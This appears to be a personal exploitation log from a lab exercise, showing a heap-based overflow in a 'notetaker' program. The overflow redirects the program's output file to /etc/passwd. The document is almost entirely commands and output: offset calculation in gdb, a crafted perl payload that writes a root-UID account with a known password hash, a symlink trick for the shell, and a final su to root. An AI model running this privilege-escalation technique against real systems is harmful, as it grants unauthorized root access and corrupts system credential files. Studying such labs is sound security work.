########## heap-based overflow ##########

./notetaker.out test
[DEBUG] buffer @ 0x56f26160: 'test'
[DEBUG] datafile @ 0x56f261d0: '/var/notes'

gdb -q
(gdb) p 0x56f261d0 - 0x56f26160
$1 = 112

# abuse it for privilege escalation
./notetaker.out $(perl -e 'print "A"x112 . "testFile"')
[DEBUG] buffer @ 0x5836e160: 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAtestFile'
[DEBUG] datafile @ 0x5836e1d0: 'testFile'

# entry must end with a shell: create symlink
mkdir /tmp/etc
ln -s /bin/sh /tmp/etc/passwd
ls -l /tmp/etc/passwd
lrwxrwxrwx 1 root root 7 Feb 23 12:13 /tmp/etc/passwd -> /bin/sh

# it doesn't matter the value of the salt in shadow, cause it's directly in the passwd file
perl -e 'print crypt("password", "whatever"). "\n"'
whJbRiU7ws9zI

perl -e 'print "myroot:whJbRiU7ws9zI:0:0:me:/root:/tmp"' | wc -c
38

gdb -q 
(gdb) p 112 - 38
$1 = 74
(gdb) p 112 - 38Quit

# replace "me": 74 + 2
perl -e 'print "myroot:whJbRiU7ws9zI:0:0:" . "A"x76 . ":/root:/tmp"' | wc -c
112

./notetaker.out $(perl -e 'print "myroot:whJbRiU7ws9zI:0:0:" . "A"x76 . ":/root:/tmp/etc/passwd"')       
[DEBUG] buffer @ 0x56d0d160: 'myroot:whJbRiU7ws9zI:0:0:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA:/root:/tmp/etc/passwd'
[DEBUG] datafile @ 0x56d0d1d0: '/etc/passwd'

# TODO it didn't work: expect entry (tested manually)
tail /etc/passwd
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
myroot:whJbRiU7ws9zI:0:0:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA:/root:/tmp/etc/passwd

su myroot
# whoami
root
